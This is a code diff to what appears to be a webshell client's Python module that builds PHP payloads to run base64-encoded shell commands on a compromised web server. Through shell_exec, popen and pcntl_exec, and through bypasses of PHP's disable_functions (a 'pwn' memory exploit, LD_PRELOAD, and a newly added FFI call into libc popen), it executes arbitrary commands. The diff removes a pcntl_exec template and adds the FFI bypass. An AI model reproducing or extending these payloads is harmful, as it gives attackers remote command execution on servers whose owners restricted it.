@@ -185,15 +185,12 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
     elif (exec_func == 'popen'):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
-    elif (exec_func == 'pcntl_exec'):
-        SYSTEM_TEMPLATE = """ob_start();pcntl_exec("/bin/bash", array("-c",base64_decode(""%s")));$o=ob_get_contents();ob_end_clean();"""
 
 
 def get_system_code(command: str, print_result: bool = True):
     bypass_df = gget("webshell.bypass_df", "webshell")
-    if (gget("webshell.exec_func", "webshell")):
-        return SYSTEM_TEMPLATE % (base64_encode(command)) + ("print($o);" if print_result else "")
-    elif (bypass_df == 1):
+    print_command = "print($o);" if print_result else ""
+    if (bypass_df == 1):
         return """pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
@@ -398,7 +395,7 @@ function pwn($cmd) {
     $o=ob_get_contents();
     ob_end_clean();
     %s
-}""" % (base64_encode(command), ("print($o);" if print_result else ""))
+}""" % (base64_encode(command), print_command)
     elif (bypass_df == 2):
         ld_preload_func = gget("webshell.ld_preload_func", "webshell")
         ld_preload_command = ""
@@ -421,7 +418,19 @@ unlink($p);
          base64_encode(command),
          gget("webshell.ld_preload_path", "webshell"),
          ld_preload_command,
-         ("print($o);" if print_result else ""))
+         print_command)
+    elif (bypass_df == 3):
+        return """$f=FFI::cdef("void *popen(const char *command, const char *type);
+int pclose(void * stream);
+int fgetc (void *fp);","libc.so.6");
+$o=$f->popen(base64_decode("%s"),"r");
+$d="";while(($c=$f->fgetc($o))!=-1)
+{$d.=str_pad(strval(dechex($c)),2,"0",0);}
+$f->pclose($o);
+$o=hex2bin($d);
+%s""" % (base64_encode(command), print_command)
+    elif (gget("webshell.exec_func", "webshell")):
+        return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
         return """print("No system execute function!\\n")"""
 
